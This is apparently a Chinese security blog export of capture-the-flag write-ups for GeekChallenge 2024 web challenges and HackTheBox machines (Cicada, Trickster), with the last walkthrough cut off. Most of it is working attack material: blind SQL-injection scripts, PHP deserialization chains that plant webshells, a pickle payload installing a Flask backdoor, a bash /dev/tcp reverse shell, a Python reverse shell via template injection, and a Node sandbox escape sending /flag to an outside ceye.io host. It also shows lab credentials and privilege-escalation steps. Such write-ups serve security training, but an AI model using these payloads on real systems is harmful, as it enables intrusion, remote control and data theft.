YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0\u0026#39;\r);\r$b = new SoapClient(null,array(\u0026#39;location\u0026#39; =\u0026gt; $target,\u0026#39;user_agent\u0026#39;=\u0026gt;\u0026#39;wupco^^Content-Type: application/x-www-form-urlencoded^^\u0026#39;.join(\u0026#39;^^\u0026#39;,$headers).\u0026#39;^^Content-Length: \u0026#39;.(string)strlen($post_string).\u0026#39;^^^^\u0026#39;.$post_string,\u0026#39;uri\u0026#39; =\u0026gt; \u0026#34;aaab\u0026#34;));\r$aaa = serialize($b);\r$aaa = str_replace(\u0026#39;^^\u0026#39;,\u0026#39;%0d%0a\u0026#39;,$aaa);\r$aaa = str_replace(\u0026#39;\u0026amp;\u0026#39;,\u0026#39;%26\u0026#39;,$aaa);\recho $aaa;\r?\u0026gt;\r#只需要useragent的部分\r#wupco%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aX-Forwarded-For: 127.0.0.1%0d%0aAUTHORIZATION: YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0d%0aContent-Length: 38%0d%0a%0d%0aexpression=system(\u0026#34;cat /flag \u0026gt; flag\u0026#34;); funnySQL #\r考点：Benchmark时间盲注+无列名注入\n进行关键字Fuzz，过滤如图\n测试payload\n\u0026#39;||if((2\u0026gt;1),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)#\r可以看到页面进入了转圈 剩下就写脚本就行了，由于information被过滤，使用mysql.innodb_table_stats来代替information_schema\nif((select(COUNT(*)\u0026gt;0)from(select/**/1/**/union/**/select*from/**/Rea11ys3ccccccr3333t)a/**/limit/**/0,1),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)\r用这个来判断列数 完整脚本如下\nimport requests\rfrom urllib.parse import urlencode\rfrom time import time\rurl=\u0026#34;http://80-5a7887db-128e-47a8-ab4c-dafafc7a3c95.challenge.ctfplus.cn/index.php?username=\u0026#34;\rdic=\u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^`{|}~\u0026#34;\rflag=\u0026#39;\u0026#39;\rfor i in range(1,100):\rfor s in dic:\r#payload=f\u0026#34;\u0026#39;||if((SUBSTR(DATABASE(),{i},1)like\u0026#39;{s}\u0026#39;),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)#\u0026#34; database: syclover\r#payload = f\u0026#34;\u0026#39;||if((substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)like\u0026#39;syclover\u0026#39;),{i},1)like\u0026#39;{s}\u0026#39;),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)#\u0026#34; # table name:Rea11ys3ccccccr3333t,users\r#payload=f\u0026#34;\u0026#39;||if((substr((select(group_concat(database_name))/**/from(mysql.innodb_table_stats)where(table_name)LIKE\u0026#39;Rea11ys3ccccccr3333t\u0026#39;),{i},1)like\u0026#39;{s}\u0026#39;),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)#\u0026#34;\r#payload=\u0026#39;||if((select(COUNT(*)\u0026gt;0)from(select/**/1/**/union/**/select*from/**/Rea11ys3ccccccr3333t)a/**/limit/**/0,1),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)# 只有一列\rpayload=f\u0026#34;\u0026#39;||if((substr((select*from(select/**/1/**/union/**/select*from/**/Rea11ys3ccccccr3333t)a/**/limit/**/1,1),{i},1)like\u0026#39;{s}\u0026#39;),BENCHMARK(10000000,SHA1(\u0026#39;test\u0026#39;)),1)#\u0026#34;\rpayload= urlencode({\u0026#39;\u0026#39;: payload})[1::]\rstart=time()\rreq=requests.get(url+payload)\rend=time()\rif end-start\u0026gt;1:\rflag+=s\rprint(\u0026#34;flag: \u0026#34;,flag)\rbreak PHP不比Java差 #\r\u0026lt;?php\rhighlight_file(__FILE__);\rerror_reporting(0);\rinclude \u0026#34;secret.php\u0026#34;;\rclass Challenge{\rpublic $file;\rpublic function Sink()\r{\recho \u0026#34;\u0026lt;br\u0026gt;!!!A GREAT STEP!!!\u0026lt;br\u0026gt;\u0026#34;;\recho \u0026#34;Is there any file?\u0026lt;br\u0026gt;\u0026#34;;\rif(file_exists($this-\u0026gt;file)){\rglobal $FLAG;\recho $FLAG;\r}\r}\r}\rclass Geek{\rpublic $a;\rpublic $b;\rpublic function __unserialize(array $data): void\r{\r$change=$_GET[\u0026#34;change\u0026#34;];\r$FUNC=$change($data);\r$FUNC();\r}\r}\rclass Syclover{\rpublic $Where;\rpublic $IS;\rpublic $Starven;\rpublic $Girlfriend;\rpublic function __toString()\r{\recho \u0026#34;__toString is called\u0026lt;br\u0026gt;\u0026#34;;\r$eee=new $this-\u0026gt;Where($this-\u0026gt;IS);\r$fff=$this-\u0026gt;Starven;\r$eee-\u0026gt;$fff($this-\u0026gt;Girlfriend);\r}\r}\runserialize($_POST[\u0026#39;data\u0026#39;]); 首先toString要使用implode函数触发，然后其中可以看到有关键字new，可以联想到PHP原生类。\nPHP函数反射类的相关知识：PHP: ReflectionFunction - Manual\n由于无法写入Challenge的file属性，就只能通过反射其他函数来进行RCE，也就是说Challenge类不需要\n根据官方文档里的使用方式\n可以如下构造\n\u0026lt;?php\r.....\r.....\r$e=new Geek();\r$e-\u0026gt;a=new Syclover();\r$e-\u0026gt;a-\u0026gt;Where=\u0026#34;ReflectionFunction\u0026#34;;\r$e-\u0026gt;a-\u0026gt;IS=\u0026#34;system\u0026#34;;\r$e-\u0026gt;a-\u0026gt;Starven=\u0026#34;invokeArgs\u0026#34;;\r$e-\u0026gt;a-\u0026gt;Girlfriend=array(\u0026#39;echo \u0026#34;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\u0026#34; | base64 -d \u0026gt;shell.php\u0026#39;);\recho serialize($e);\r//O:4:\u0026#34;Geek\u0026#34;:2:{s:1:\u0026#34;a\u0026#34;;O:8:\u0026#34;Syclover\u0026#34;:4:{s:5:\u0026#34;Where\u0026#34;;s:18:\u0026#34;ReflectionFunction\u0026#34;;s:2:\u0026#34;IS\u0026#34;;s:6:\u0026#34;system\u0026#34;;s:7:\u0026#34;Starven\u0026#34;;s:10:\u0026#34;invokeArgs\u0026#34;;s:10:\u0026#34;Girlfriend\u0026#34;;a:1:{i:0;s:66:\u0026#34;echo \u0026#34;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\u0026#34; | base64 -d \u0026gt;shell.php\u0026#34;;}}s:1:\u0026#34;b\u0026#34;;N;} 需要对payload进行URL编码\n然后读取根目录flag，需要权限\nfind / -user root -perm -4000 -print 2\u0026gt;/dev/null 存在file命令可以使用\n相关文章：file | GTFOBins\n额，好像无法直接在页面回显，需要反弹Shell才能看到报错信息\nsystem(\u0026#34;/bin/bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/ip/port \u0026lt;\u0026amp;1\u0026#39;\u0026#34;); 注意payload依然需要url编码\nnot_just_pop #\r源码如下\n\u0026lt;?php\rhighlight_file(__FILE__);\rini_get(\u0026#39;open_basedir\u0026#39;);\rclass lhRaMK7{\rpublic $Do;\rpublic $You;\rpublic $love;\rpublic $web;\rpublic function __invoke()\r{\recho \u0026#34;我勒个豆，看来你有点实力，那接下来该怎么拿到flag呢？\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;;\reval($this-\u0026gt;web);\r}\rpublic function __wakeup()\r{\r$this-\u0026gt;web=$this-\u0026gt;love;\r}\rpublic function __destruct()\r{\rdie($this-\u0026gt;You-\u0026gt;execurise=$this-\u0026gt;Do);\r}\r}\rclass Parar{\rprivate $execurise;\rpublic $lead;\rpublic $hansome;\rpublic function __set($name,$value)\r{\recho $this-\u0026gt;lead;\r}\rpublic function __get($args)\r{\rif(is_readable(\u0026#34;/flag\u0026#34;)){\recho file_get_contents(\u0026#34;/flag\u0026#34;);\r}\relse{\recho \u0026#34;还想直接读flag，洗洗睡吧，rce去\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;;\rif ($this-\u0026gt;execurise==\u0026#34;man!\u0026#34;) {\recho \u0026#34;居然没坠机\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;;\rif(isset($this-\u0026gt;hansome-\u0026gt;lover)){\rphpinfo();\r}\r}\relse{\recho($this-\u0026gt;execurise);\recho \u0026#34;你也想被肘吗\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;;\r}\r}\r}\r}\rclass Starven{\rpublic $girl;\rpublic $friend;\rpublic function __toString()\r{\rreturn \u0026#34;试试所想的呗，说不定成功了\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$this-\u0026gt;girl-\u0026gt;abc;\r}\rpublic function __call($args1,$args2)\r{\r$func=$this-\u0026gt;friend;\r$func();\r}\r}\rclass SYC{\rprivate $lover;\rpublic $forever;\rpublic function __isset($args){\rreturn $this-\u0026gt;forever-\u0026gt;nononon();\r}\r}\r$Syclover=$_GET[\u0026#39;Syclover\u0026#39;];\rif (isset($Syclover)) {\runserialize(base64_decode($Syclover));\rthrow new Exception(\u0026#34;None\u0026#34;);\r}else{\recho(\u0026#34;怎么不给我呢，是不喜欢吗？\u0026#34;);\r} POP链条\nlhRaMK7-\u0026gt;__destruct\rParar-\u0026gt;__get\rSYC-\u0026gt;__isset\rStarven-\u0026gt;__call\rlhRaMK7-\u0026gt;__invoke 其中throw new Exception(\u0026quot;None\u0026quot;);，用GC回收机制可以绕过\n浅析PHP GC垃圾回收机制及常见利用方式 - 先知社区 (aliyun.com) wakeup不用管，只需要把love设置为命令即可\n\u0026lt;?php\rclass lhRaMK7{\rpublic $Do=\u0026#34;phpinfo();\u0026#34;;\rpublic $You;\rpublic $love;\rpublic $web;\r}\rclass Parar{\rprivate $execurise=\u0026#34;man!\u0026#34;;\rpublic $lead;\rpublic $hansome;\rpublic function getexe(){\rreturn $this-\u0026gt;execurise;\r}\r}\rclass Starven{\rpublic $girl;\rpublic $friend;\r}\rclass SYC{\rprivate $lover=\u0026#34;123\u0026#34;;\rpublic $forever;\rfunction getlover(){\rreturn $this-\u0026gt;lover;\r}\rpublic function __isset($args){\recho \u0026#34;__isset\u0026#34;;\r}\r}\r$l=new lhRaMK7();\r$p=new Parar();\r$star=new Starven();\r$syc=new SYC();\r$l-\u0026gt;You=$p;\r$p-\u0026gt;lead=$star;\r$star-\u0026gt;girl=$p;\r$p-\u0026gt;hansome=\u0026amp;$syc;\r$syc-\u0026gt;forever=$star;\r$star-\u0026gt;friend=$l;\r//命令\r$l-\u0026gt;love=\u0026#34;include \u0026#39;/tmp/a.php\u0026#39;;\u0026#34;; //$l-\u0026gt;love = \u0026#34;file_put_contents(\u0026#39;/tmp/a.php\u0026#39;, \u0026#39;\u0026lt;?php eval(\\$_POST[\\\\\u0026#39;a\\\\\u0026#39;]); \u0026#39;);\u0026#34;;\r$ser=serialize(array($l,new lhRaMK7()));\recho $ser.\u0026#34;\\n\u0026#34;;\r$ser=str_replace(\u0026#34;i:1;O:7\u0026#34;,\u0026#34;i:0;O:7\u0026#34;,$ser);\recho base64_encode($ser); 这里的思路是先写入一个/tmp/a.php一句话木马，然后再包含他，POST执行命令\n在phpinfo里面看见了基本上系统命令函数被过滤完了\n连接蚁剑，使用disable_functions插件，如图\n正常没有权限读取flag\n提示说尝试sudo\n发现env是剧有特殊权限的\n通过sudo和env可以执行任意命令\nsudo env bash -c \u0026#39;cat /flag\u0026#39; ez_python #\r给的Hint文件\nimport os\rimport secrets\rfrom flask import Flask, request, render_template_string, make_response, render_template, send_file\rimport pickle\rimport base64\rimport black\rapp = Flask(__name__)\r#To Ctfer：给你源码只是给你漏洞点的hint，怎么绕？black.py黑盒，唉无意义\r@app.route(\u0026#39;/\u0026#39;)\rdef index():\rreturn render_template_string(open(\u0026#39;templates/index.html\u0026#39;).read())\r@app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])\rdef register():\rif request.method == \u0026#39;POST\u0026#39;:\rusname = request.form[\u0026#39;username\u0026#39;]\rpasswd = request.form[\u0026#39;password\u0026#39;]\rif usname and passwd:\rheart_cookie = secrets.token_hex(32)\rresponse = make_response(f\u0026#34;Registered successfully with username: {usname} \u0026lt;br\u0026gt; Now you can go to /login to heal starven\u0026#39;s heart\u0026#34;)\rresponse.set_cookie(\u0026#39;heart\u0026#39;, heart_cookie)\rreturn response\rreturn render_template(\u0026#39;register.html\u0026#39;)\r@app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])\rdef login():\rheart_cookie = request.cookies.get(\u0026#39;heart\u0026#39;)\rif not heart_cookie:\rreturn render_template(\u0026#39;warning.html\u0026#39;)\rif request.method == \u0026#39;POST\u0026#39; and request.cookies.get(\u0026#39;heart\u0026#39;) == heart_cookie:\rstatement = request.form[\u0026#39;statement\u0026#39;]\rtry:\rheal_state = base64.b64decode(statement)\rprint(heal_state)\rfor i in black.blacklist:\rif i in heal_state:\rreturn render_template(\u0026#39;waf.html\u0026#39;)\rpickle.loads(heal_state)\rres = make_response(f\u0026#34;Congratulations! You accomplished the first step of healing Starven\u0026#39;s broken heart!\u0026#34;)\rflag = os.getenv(\u0026#34;GEEK_FLAG\u0026#34;) or os.system(\u0026#34;cat /flag\u0026#34;)\ros.system(\u0026#34;echo \u0026#34; + flag + \u0026#34; \u0026gt; /flag\u0026#34;)\rreturn res\rexcept Exception as e:\rprint( e)\rpass\rreturn \u0026#34;Error!!!! give you hint: maybe you can view /starven_s3cret\u0026#34;\rreturn render_template(\u0026#39;login.html\u0026#39;)\r@app.route(\u0026#39;/monologue\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;])\rdef joker():\rreturn render_template(\u0026#39;joker.html\u0026#39;)\r@app.route(\u0026#39;/starven_s3cret\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])\rdef secret():\rreturn send_file(__file__,as_attachment=True)\rif __name__ == \u0026#39;__main__\u0026#39;:\rapp.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000, debug=False) 这道题的和MoeCTF2024的PetStore差不多，我的文章里刚好有，可以直接写入Flask内存马\nMoeCTF 2024 - HYH (hyhforever.top) 里面的poc直接拿过来用就可以了\nimport pickle\rimport base64\rimport os\rclass Pet:\rdef __reduce__(self):\rreturn (eval, (\r\u0026#34;__import__(\\\u0026#34;sys\\\u0026#34;).modules[\u0026#39;__main__\u0026#39;].__dict__[\u0026#39;app\u0026#39;].before_request_funcs.setdefault(None, []).append(lambda :__import__(\u0026#39;os\u0026#39;).popen(request.args.get(\u0026#39;cmd\u0026#39;)).read())\u0026#34;,))\re = Pet()\rpoc = pickle.dumps(e)\rprint(base64.b64encode(poc).decode())\r#gASVwgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIymX19pbXBvcnRfXygic3lzIikubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLCBbXSkuYXBwZW5kKGxhbWJkYSA6X19pbXBvcnRfXygnb3MnKS5wb3BlbihyZXF1ZXN0LmFyZ3MuZ2V0KCdjbWQnKSkucmVhZCgpKZSFlFKULg== 然后直接执行命令即可\npy_game #\r随便注册一个用户进行登录，提示权限是普通用户\n开始游戏，在源码里得到flag的位置在/flag\n将当前用户的session值拿去解密\njwt解密失败\n由于题目是Flask搭建的，可以考虑尝试flask-session的密钥爆破（因为并没有得到任何secret-key的信息）\nGithub工具：Paradoxis/Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. (github.com)\npip3 install flask-unsign[wordlist] 得到密钥为：a123456\n下面是python的生成session的脚本\nfrom itsdangerous import base64_decode\rimport zlib\rfrom flask.sessions import SecureCookieSessionInterface\rimport ast\rclass MockApp(object):\rdef __init__(self, secret_key):\rself.secret_key = secret_key\rdef encode(secret_key, session_cookie_structure):\rtry:\rapp = MockApp(secret_key)\rsession_cookie_structure = dict(ast.literal_eval(session_cookie_structure))\rsi = SecureCookieSessionInterface()\rs = si.get_signing_serializer(app)\rreturn s.dumps(session_cookie_structure)\rexcept Exception as e:\rreturn \u0026#34;[Encoding error] {}\u0026#34;.format(e)\rdef decode(session_cookie_value, secret_key=None):\rtry:\rif secret_key is None:\rcompressed = False\rpayload = session_cookie_value\rif payload.startswith(\u0026#39;.\u0026#39;):\rcompressed = True\rpayload = payload[1:]\rdata = payload.split(\u0026#34;.\u0026#34;)[0]\rdata = base64_decode(data)\rif compressed:\rdata = zlib.decompress(data)\rreturn data\relse:\rapp = MockApp(secret_key)\rsi = SecureCookieSessionInterface()\rs = si.get_signing_serializer(app)\rreturn s.loads(session_cookie_value)\rexcept Exception as e:\rreturn \u0026#34;[Decoding error] {}\u0026#34;.format(e)\r# 示例用法\rcookie_structure = encode(secret_key=\u0026#39;a123456\u0026#39;,session_cookie_structure=\u0026#34;{\u0026#39;_flashes\u0026#39;: [(\u0026#39;success\u0026#39;, \u0026#39;登录成功\u0026#39;)], \u0026#39;username\u0026#39;: \u0026#39;admin\u0026#39;}\u0026#34;)\rprint(cookie_structure) 替换cookie后进入dashboard\n在Admin Panel里下载到源码的pyc文件，去反编译网站：python反编译 - 在线工具 (tool.lu)\n经过我删减后的有用源码如下\nimport json\rfrom lxml import etree\rfrom flask import Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify\rapp = Flask(__name__)\rapp.secret_key = \u0026#39;a123456\u0026#39;\rapp.config[\r\u0026#39;xml_data\u0026#39;] = \u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;GeekChallenge2024\u0026gt;\u0026lt;EventName\u0026gt;Geek Challenge\u0026lt;/EventName\u0026gt;\u0026lt;Year\u0026gt;2024\u0026lt;/Year\u0026gt;\u0026lt;Description\u0026gt;This is a challenge event for geeks in the year 2024.\u0026lt;/Description\u0026gt;\u0026lt;/GeekChallenge2024\u0026gt;\u0026#39;\radmin = User(\u0026#39;admin\u0026#39;, \u0026#39;123456j1rrynonono\u0026#39;)\rUsers = [\radmin]\rdef update(src, dst):\rfor k, v in src.items():\rif hasattr(dst, \u0026#39;__getitem__\u0026#39;):\rif dst.get(k) and isinstance(v, dict):\rupdate(v, dst.get(k))\relse:\rdst[k] = v\rif hasattr(dst, k) and isinstance(v, dict):\rupdate(v, getattr(dst, k))\rcontinue\rsetattr(dst, k, v)\rdef xml_parse():\rtry:\rxml_bytes = app.config[\u0026#39;xml_data\u0026#39;].encode(\u0026#39;utf-8\u0026#39;)\rparser = etree.XMLParser(True, True, **(\u0026#39;load_dtd\u0026#39;, \u0026#39;resolve_entities\u0026#39;))\rtree = etree.fromstring(xml_bytes, parser, **(\u0026#39;parser\u0026#39;,))\rresult_xml = etree.tostring(tree, True, \u0026#39;utf-8\u0026#39;, True, **(\u0026#39;pretty_print\u0026#39;, \u0026#39;encoding\u0026#39;, \u0026#39;xml_declaration\u0026#39;))\rreturn Response(result_xml, \u0026#39;application/xml\u0026#39;, **(\u0026#39;mimetype\u0026#39;,))\rexcept etree.XMLSyntaxError:\re = None\rtry:\rreturn str(e)\re = None\rdel e\rreturn None\rxml_parse = app.route(\u0026#39;/xml_parse\u0026#39;)(xml_parse)\rblack_list = [\r\u0026#39;__class__\u0026#39;.encode(),\r\u0026#39;__init__\u0026#39;.encode(),\r\u0026#39;__globals__\u0026#39;.encode()]\rdef update_route():\rif \u0026#39;username\u0026#39; in session and session[\u0026#39;username\u0026#39;] == \u0026#39;admin\u0026#39;:\rif request.data:\rtry:\rif not check(request.data):\rreturn (\u0026#39;NONONO, Bad Hacker\u0026#39;, 403)\rdata = None.loads(request.data.decode())\rprint(data)\rif all((lambda .0: pass)(data.values())):\rupdate(data, User)\rreturn (jsonify({\r\u0026#39;message\u0026#39;: \u0026#39;更新成功\u0026#39;}), 200)\rreturn None\rexcept Exception:\re = None\rtry:\rreturn (f\u0026#39;\u0026#39;\u0026#39;Exception: {str(e)}\u0026#39;\u0026#39;\u0026#39;, 500)\re = None\rdel e\rreturn (\u0026#39;No data provided\u0026#39;, 400)\rreturn redirect(url_for(\u0026#39;login\u0026#39;))\rreturn None 值得注意的就是这个xml的路由，其中包含了更新操作\n由于数据是直接获取的request.data并且只能通过json格式获取，那么容易联想到python的原型链污染\n包括在极客大挑战2023的文章中也出现过类似题目，这里不再赘述\n极客大挑战2023 - HYH (hyhforever.top)\nPython原型链污染攻击利用技巧 - Py学习 (python88.com)\n总的思路来说，就是对app.config里的xml值进行更新，然后请求xml_parse进行渲染\nblack_list = [\r\u0026#39;__class__\u0026#39;.encode(),\r\u0026#39;__init__\u0026#39;.encode(),\r\u0026#39;__globals__\u0026#39;.encode()] 黑名单可以使用unicode编码绕过，也就是\\u00加上十六进制的数字\n这段代码为什么会出现XXE？\n问题就在于这里的etree.XMLParser里的第二个参数resolve_entities，如果设置为了True，则允许引入外部实体\nXXE的部分可以简单看一下这几篇文章\nXXE漏洞\u0026amp;绕过 - CxAgoni - 博客园 (cnblogs.com)\n【小迪安全】Day39web漏洞-XXE\u0026amp;XML之利用检测绕过全解 - 哔哩哔哩 (bilibili.com)\n至于这个file协议，不清楚是不是python包里的自带的过滤，小写的file是会报错invalid character\n发包之后在来到/xml_parse路由访问即可获取到flag\nnoSandbox #\rmongoDB注入+沙盒逃逸\nMongoDB注入的相关知识\nbeginCTF 2024 Web方向题解WP 全_ctf websocket-CSDN博客\nNosql注入总结 - FreeBuf网络安全行业门户\n如图构造payload登录成功\n进入沙盒逃逸\n相关知识文章\n全世界最简单的CTF - nnonkey k1n9的博客\nNKCTF2024-web-wp - Eddie_Murphy - 博客园 (cnblogs.com)\n这里使用的是curl -T将目标文件外带\n并且使用到了ceye平台\nCEYE平台的使用 - 时光不改 - 博客园 (cnblogs.com) 构造payload\nthrow new Proxy({}, {\rget: function(){\rconst test =`Process`.toLocaleLowerCase();\rconst exp =`child_Process`.toLocaleLowerCase();\rconst cc = arguments.callee.caller;\rconst p = (cc.constructor.constructor(`return ${test}`))();\rconst obj = p.mainModule.require(`${exp}`);\rconst ex = Object.getOwnPropertyDescriptor(obj,\r`${`${`exe`}cSync`}`);\rreturn ex.value(`curl http://5pgv47.ceye.io/ -T /flag`).toString();\r}\r}) 发包后在ceye中得到回显\n","date":"2024-10-31","externalUrl":null,"permalink":"/posts/2024/10/geekchallenge2024/","section":"Posts","summary":"","title":"极客大挑战2024","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Easy Nmap Scan #\r发现靶机存在smb网络文件共享服务\n使用smbclient连接，发现以下的目录\n并且在HR的目录下发现了一个txt文件\nDear new hire!\rWelcome to Cicada Corp! We\u0026#39;re thrilled to have you join our team. As part of our security protocols, it\u0026#39;s essential that you change your default password to something unique and secure.\rYour default password is: Cicada$M6Corpb*@Lp#nZp!8\rTo change your password:\r1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.\r2. Once logged in, navigate to your account settings or profile settings section.\r3. Look for the option to change your password. This will be labeled as \u0026#34;Change Password\u0026#34;.\r4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.\r5. After changing your password, make sure to save your changes.\rRemember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.\rIf you encounter any issues or need assistance with changing your password, don\u0026#39;t hesitate to reach out to our support team at support@cicada.htb.\rThank you for your attention to this matter, and once again, welcome to the Cicada Corp team!\rBest regards,\rCicada Corp 获取一个默认的密码：Cicada$M6Corpb*@Lp#nZp!8\nRID BRUTE FORCE #\r使用Rid爆破枚举用户\n使用enum4linux-ng通过Michael wrightson用户连接到服务器，并且提取各种信息\nenum4linux-ng -A -u \u0026#39;Michael.wrightson\u0026#39; -p \u0026#39;Cicada$M6Corpb*@Lp#nZp!8\u0026#39; 10.10.11.35 发现david的密码：aRt$Lp#7t*VQ!3\n连接smbclient，发现备份脚本\n$sourceDirectory = \u0026#34;C:\\smb\u0026#34;\r$destinationDirectory = \u0026#34;D:\\Backup\u0026#34;\r$username = \u0026#34;emily.oscars\u0026#34;\r$password = ConvertTo-SecureString \u0026#34;Q!3@Lp#M6b*7t*Vt\u0026#34; -AsPlainText -Force\r$credentials = New-Object System.Management.Automation.PSCredential($username, $password)\r$dateStamp = Get-Date -Format \u0026#34;yyyyMMdd_HHmmss\u0026#34;\r$backupFileName = \u0026#34;smb_backup_$dateStamp.zip\u0026#34;\r$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName\rCompress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath\rWrite-Host \u0026#34;Backup completed successfully. Backup file saved to: $backupFilePath\u0026#34; 使用evil-winrm登录得到user.txt\nPrivilege Escalation #\r查询当前用户权限\n*Evil-WinRM* PS C:\\Users\u0026gt; whoami /all 关于这个SeBackupPrivilege：Windows Privilege Escalation: SeBackupPrivilege - Hacking Articles\n根据文章中的步骤\n使用pypykatz得到admin的hash值\n最后使用evil-winrm的hash登录到admin，得到root.txt\nSummary #\r先是用smb免密登录获取到一个明文密码，然后使用crackmapexec进行RID爆破用户名。\n对用户名进行遍历登录，发现能够进入的SMB账户，并且得到一个包含账户密码备份脚本。\n再用evil-winrm进行登录下载sam和system，通过pypykatz获取到admin的hash值用来进行hash登录，获取到Administrator权限\nWindows就是让人头大。。。\n","date":"2024-09-30","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-cicada/","section":"Posts","summary":"","title":"HTB-Cicada","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Git Hack #\r我在trickster的主域名发现了一个shop的子域名网站\n这个shop看起来像是使用PrestaShop搭建，我搜索了一下相关的漏洞，无法直接使用\n并且尝试了shop里的各种注入点，没有明显的漏洞，不过在我遍历目录的时候，发现了.git的目录\n然后我使用Githack工具\n[github author=\u0026ldquo;lijiejie\u0026rdquo; project=\u0026ldquo;GitHack\u0026rdquo;][/github]\n将这个目录作为url的路径，进入到了后台的登陆界面，并且得到PrestaShop的版本号为8.1.5\n在之前的.git目录下我搜索到了一个admin_pannel，里面好像存在一个adam的用户\nCVE-2024-34716 #\r[github author=\u0026ldquo;aelmokhtar\u0026rdquo; project=\u0026ldquo;CVE-2024-34716\u0026rdquo;][/github]\n得到www-data权限\n在config里面找到一些信息\n登录上mysql之后，在ps_employee表中发现james的密码hash\n使用hashcat，破解除了james的密码：alwaysandforever\nssh登录上去，得到user.txt\nPrivilege Escalation #\r上传linpeas，发现当前服务器运行着docker\n上传fscan，发现172.17.0.2主机\n[github author=\u0026ldquo;shadow1ng\u0026rdquo; project=\u0026ldquo;fscan\u0026rdquo;][/github]\n并且发现5000端口是打开的\n将端口代理出来\n进入到Change Detection\nCVE-2024-32651 #\r相关知识：CVE-2024-32651 –（Changedetection.io） – Hacktive 安全博客 (hacktivesecurity.com)\n首先在kali上打开httpserver服务，并且添加到change detection\n进入Edit，确保URL、Time、Send notification\n然后进入notification，在Body处写入SSTI反弹shell的脚本\n{{ self.__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).system(\u0026#39;python -c \\\u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.16.30\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;sh\u0026#34;)\\\u0026#39;\u0026#39;) }} 然后保存即可\n此处SSTI的原理是，这个服务会探测网站的变化，如果网站内容有变化那么就会触发通知信息\n而Body是允许使用Jinja2模板来写内容\n在kali上面，由于打开了80端口的httpserver服务，只需要写入一个index.html，并且不断修改他直到被检测到就行了\n成功反弹到shell，但是没有root.txt呢？应该只是一个容器\n使用history命令发现到密码，因为apt update需要管理员权限才能执行\n使用密码切换到root用户，得到root.txt\nSummary #\rGit文件泄露好久没遇到过，刚做的时候还没想到这个，去讨论区看了一下才发现\nPrestaShop的Github CVE，在几天前是用不了的（不知道为什么），后来作者修改了一下又能正常使用了\nhistory来查看密码泄露也是比较独特的点，之前也没想到\n","date":"2024-09-28","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-trickster/","section":"Posts","summary":"","title":"HTB-Trickster","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap Scan #\r开放端口：22、80\n并且注意到80端口上有一个重定向，添加到/etc/hosts\nRegister #\r注意到有/login路由，使用简单的密码组合登陆失败，猜测存在/register路由\n但是需要先拿到邀请码\n我在浏览器的network里面发现了一个独特的js文件\nChatGPT是这样分析的\n控制台给出一段加密信息，加密方式是ROT13\n需要发送一个POST包到指定的路径\n将code进行Base64解密得到邀请码\n注册完成后成功进入页面\nRCE #\r经过源代码的检查，发现存在/api的路径\n{\r\u0026#34;v1\u0026#34;: {\r\u0026#34;user\u0026#34;: {\r\u0026#34;GET\u0026#34;: {\r\u0026#34;/api/v1\u0026#34;: \u0026#34;Route List\u0026#34;,\r\u0026#34;/api/v1/invite/how/to/generate\u0026#34;: \u0026#34;Instructions on invite code generation\u0026#34;,\r\u0026#34;/api/v1/invite/generate\u0026#34;: \u0026#34;Generate invite code\u0026#34;,\r\u0026#34;/api/v1/invite/verify\u0026#34;: \u0026#34;Verify invite 